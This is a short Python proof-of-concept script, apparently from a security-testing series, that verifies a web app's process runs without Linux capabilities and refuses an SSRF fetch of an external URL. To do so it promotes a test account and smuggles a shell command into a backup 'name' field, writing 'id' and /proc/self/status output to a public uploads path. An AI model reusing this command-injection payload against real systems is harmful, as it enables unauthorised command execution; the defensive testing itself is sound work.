# -*- coding: utf-8 -*-
"""Процесс без эффективных capabilities. Внешний URL из SSRF не скачивается.

    python 27_runtime_bounds.py
"""
import time

from _http import Client, parser


def main():
    args = parser("Нет capabilities и нет выхода SSRF наружу").parse_args()
    client = Client(args.base)
    stamp = str(int(time.time()))[-6:]
    name = f"bound{stamp}"
    email = f"{name}@poc.local"
    password = "Passw0rd!bound"
    token = client.register(name, email, password)
    token = client.promote(token, name, email, password)
    outfile = f"caps-{stamp}.txt"
    status, _, blob = client.call(
        "POST",
        "/api/user/backup",
        token=token,
        body={
            "backup": {
                "name": (
                    "x; { id; grep -E '^Cap(Eff|Prm|Bnd|Amb):' /proc/self/status; } "
                    f"> /srv/media/uploads/{outfile} #"
                )
            }
        },
    )
    if status != 200:
        raise SystemExit(f"снимок capabilities не снят: {status} {blob[:200]!r}")
    status, _, body = client.call("GET", f"/uploads/{outfile}")
    text = body.decode("utf-8", "replace")
    if status != 200 or "uid=10001" not in text or "CapEff:" not in text:
        raise SystemExit(f"файл capabilities пустой: {status} {text[:200]!r}")
    cap = next(line.split()[1] for line in text.splitlines() if line.startswith("CapEff:"))
    if cap.strip("0") != "":
        raise SystemExit("CapEff не нулевой:\n" + text)
    print("OK процесс без capabilities")
    print(text.strip())
    status, _, blob = client.call(
        "POST",
        "/api/user/avatar/import",
        token=token,
        body={"url": "http://example.com/"},
        timeout=12,
    )
    if status == 200:
        raise SystemExit("внешний URL скачался")
    print(f"OK внешний импорт отклонён: {status} {blob.decode('utf-8', 'replace')[:160]}")


if __name__ == "__main__":
    main()
